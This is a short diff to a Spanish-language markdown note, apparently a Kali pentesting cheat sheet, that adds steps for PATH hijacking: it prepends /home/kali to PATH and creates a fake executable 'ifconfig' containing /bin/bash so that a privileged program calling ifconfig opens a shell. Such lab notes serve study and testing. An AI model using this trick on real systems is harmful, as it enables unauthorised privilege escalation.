@@ -18,6 +18,15 @@ export PATH=/ruta_que_queramos_añadir:$PATH
 export PATH=/home/kali:$PATH
 ```
 
+crear un binario malicioso
+```bash
+nano ifconfig
+(contenido:
+/bin/bash)
+
+chmod +x ifconfig
+```
+
 De esta manera, si tenemos un binario en **/home/kali** llamado **ifconfig** cuyo contenido sea el siguiente:
 ```bash
 /bin/bash
